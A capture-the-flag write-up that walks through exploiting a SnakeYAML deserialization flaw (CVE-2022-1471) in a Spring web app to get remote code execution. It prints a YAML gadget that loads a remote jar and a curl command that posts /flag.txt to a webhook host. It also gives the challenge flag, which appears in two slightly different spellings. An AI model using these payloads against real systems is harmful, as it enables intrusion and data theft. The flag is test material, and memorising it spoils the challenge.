# Watersnake
> As the United Nations of Zenium and the Board of Arodor engage in a fierce competition to establish a colony on Mars using Vitalium. State hackers from UNZ identify an exposed instance of the critical facility water management software, Watersnakev3, in one of Arodor's main water treatment plants. The objective is to gain control over the water supply, and weaken the Arodor's infrastructure.

## About the Challenge
We were given a source code (You can download the source code [here](web_watersnake.zip)). Here is the preview of the website


[Image extracted text: SS' WaterSnake v3
Dashboard
Firmware Update
About
Water Tank Module Info
Projected Levels By Current Usage
Total Water Tanks: 4
400OL
Water Tank Maximum Capacity: 1OO0 liters
3000L
Firmware Version: V3
2000L
1OOOL
15
CanvasJS Trial
com
Water Levels
Tank1
Tank 2
Tank 3
Tank 4
Aug
Aug
Aug
Aug
Aug anvasis;C]


And also there is another functionality where we can submit our own YAML configuration


[Image extracted text: SS' WaterSnake v3
Dashboard
Firmware Update
About
Firmware Update
Enter an update configuration file in the appropriate format (YAML)
version: 3.5.2
date: 2175-06-11
author: AquaTech Solutions
components:
name: WaterSensors
version: 2.1.0
description: Enhances accuracy and reliability:
checksum: ABC12345
name: DataLogger
version: 1.7.5
description: Improves data logging capabilities for better analytics:
checksum: GHI98765
Submit]


## How to Solve?
If we check the the `Controller.java` code especially a function called `update()`

```java
import org.yaml.snakeyaml.Yaml;
...
...
@PostMapping("/update")
	public String update(@RequestParam(name = "config") String updateConfig) {
       	InputStream is = new ByteArrayInputStream(updateConfig.getBytes());
      
       	Yaml yaml = new Yaml();

	    Map<String, Object> obj = yaml.load(is);

		obj.forEach((key, value) -> System.out.println(key + ":" + value));

		return "Config queued for firmware update";
	}
}
```

You will see this program using `snakeyaml`. And the packages is outdated if we check the version in `pom.xml` file


[Image extracted text: ena.
Lests]
epende
groupId>org-yaml
groupId>
<artifactid>snakeyaml
artifactId>
<version 1.33</version>
dependency>
dependencies>
ency>]


snakeyaml is vulenrable to CVE-2022-1471. So, to exploit this website using CVE-2022-1471, we can use this GitHub [repository](https://github.com/artsploit/yaml-payload/)


[Image extracted text: public AwesomeScriptEngineFactory()
try
Runt
getRunt
()
exec ( "curl
~F password-@/flag.txt webhook site/47c2cdc9-1233-4ac8-8e8b-55efed6aeb2c")
catch (IOException e)
e.printStackTrace() ;
~ime .
~imet]


Don't forget to change the payload into the blow code because we can't use reverse shell payload (idk why). So, in this case i just send the content of `flag.txt` into webhook

```
curl -F password=@/flag.txt webhook.site/xxxxxxx
```

And then input this in the YAML form

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-server/yaml-payload.jar"]
  ]]
]
```

Check the webhook again and you will see a request from the website


[Image extracted text: Request Details
Permalink
Raw content
Expont as
POST
http Ilwebhook site/47c2cdc9-1233-4ac8-8e8b-55efeO6aeb2c
Host
83.136.254.230 whois
Date
07/15/2023 12.32.22 AM (2 days ago)
Size
0 bytes
e42abc07-9281-4e22-bbc9-d2e8164fdd75
Files
password
flag.txt
Download (19 bytes)
Query strings
(empty )
No content]


And then download the `flag` file


[Image extracted text: File
Edit
View
HTB{r1d3_th3_snak3}]


```
HTB{r1d3_th3_sn4k3}
```